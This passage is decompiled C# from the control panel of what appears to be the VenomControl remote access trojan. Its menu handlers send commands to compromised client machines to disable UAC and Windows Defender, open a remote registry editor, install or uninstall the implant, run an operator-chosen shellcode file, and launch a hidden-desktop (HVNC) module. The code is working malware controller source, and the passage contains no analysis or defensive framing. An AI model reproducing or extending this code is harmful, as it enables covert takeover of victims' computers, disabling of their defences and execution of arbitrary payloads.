				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000192 RID: 402 RVA: 0x00015554 File Offset: 0x00013754
		private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "DisableUAC:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, true));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000193 RID: 403 RVA: 0x000156F0 File Offset: 0x000138F0
		private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "DisableDefedner:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				FormMain.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, true));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000194 RID: 404 RVA: 0x0001588C File Offset: 0x00013A8C
		private void ConnectTimeout_Tick(object sender, EventArgs e)
		{
			Clients[] allClients = this.GetAllClients();
			if (allClients.Length != 0)
			{
				foreach (Clients clients in allClients)
				{
					if (Methods.DiffSeconds(clients.LastPing, DateTime.Now) > 20.0)
					{
						clients.Disconnected();
					}
				}
			}
		}

		// Token: 0x06000195 RID: 405 RVA: 0x000158DC File Offset: 0x00013ADC
		private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Regedit.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + clients.ID] == null)
					{
						new FormRegistryEditor
						{
							Name = "remoteRegedit:" + clients.ID,
							Text = "remoteRegedit:" + clients.ID,
							ParentClient = clients,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000196 RID: 406 RVA: 0x000159DC File Offset: 0x00013BDC
		private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000197 RID: 407 RVA: 0x00015AB4 File Offset: 0x00013CB4
		private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000198 RID: 408 RVA: 0x00015B8C File Offset: 0x00013D8C
		private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Fun.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormFun)Application.OpenForms["fun:" + clients.ID] == null)
					{
						new FormFun
						{
							Name = "fun:" + clients.ID,
							Text = "fun:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000199 RID: 409 RVA: 0x00015C8C File Offset: 0x00013E8C
		private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					openFileDialog.Multiselect = false;
					openFileDialog.Filter = "(*.bin)|*.bin";
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "Shellcode";
						msgPack.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600019A RID: 410 RVA: 0x00015DAC File Offset: 0x00013FAC
		private void noSystemToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "nosystem";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (Clients clients in this.GetSelectedClients())
				{
					if (clients.LV.SubItems[this.lv_user.Index].Text.ToLower() == "system")
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600019B RID: 411 RVA: 0x00002BA2 File Offset: 0x00000DA2
		private void venomHVNCToolStripMenuItem_Click(object sender, EventArgs e)
		{
			new FrmMain().Show();
		}

		// Token: 0x0600019C RID: 412 RVA: 0x00013A90 File Offset: 0x00011C90
		private void BtnClientFolder_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = this.GetSelectedClients();
				if (selectedClients.Length == 0)
				{
					Process.Start(Application.StartupPath);
				}
				else
				{
					foreach (Clients clients in selectedClients)
					{
						string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
						if (Directory.Exists(text))
						{
							Process.Start(text);
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600019D RID: 413 RVA: 0x00002BA2 File Offset: 0x00000DA2
		private void siticoneGradientButton3_Click(object sender, EventArgs e)
		{
			new FrmMain().Show();
		}

		// Token: 0x0600019E RID: 414 RVA: 0x00002BA2 File Offset: 0x00000DA2
		private void BtcnhvncClients_Click(object sender, EventArgs e)
		{
			new FrmMain().Show();
		}

		// Token: 0x0600019F RID: 415 RVA: 0x00002BAE File Offset: 0x00000DAE
		private void BtnPMTelegram_Click(object sender, EventArgs e)
		{
			Process.Start("https://t.me/VenomControl");
		}

		// Token: 0x060001A0 RID: 416 RVA: 0x00002BBB File Offset: 0x00000DBB
		private void Btnwebsite_Click(object sender, EventArgs e)
		{
			Process.Start("https://venomcontrol.com/");
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x00002BC8 File Offset: 0x00000DC8
		private void BtnTGgroup_Click(object sender, EventArgs e)
		{
			Process.Start("https://vimeo.com/user140055609");
		}

		// Token: 0x060001A2 RID: 418 RVA: 0x00015EA4 File Offset: 0x000140A4
		private void selectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			int num = 0;
			foreach (object obj in this.listView1.Items)
			{
				num = this.listView1.Items.Count;
			}
			for (int i = 0; i < num; i++)
			{
				this.listView1.Items[i].Selected = true;
			}
		}

		// Token: 0x040000F0 RID: 240
		private bool trans;

		// Token: 0x040000F1 RID: 241
		public cGeoMain cGeoMain = new cGeoMain();

		// Token: 0x040000F2 RID: 242
		public static List<AsyncTask> getTasks = new List<AsyncTask>();

		// Token: 0x040000F3 RID: 243
		private ListViewColumnSorter lvwColumnSorter;

		// Token: 0x040000F4 RID: 244
		public static bool islogin = false;
	}
}
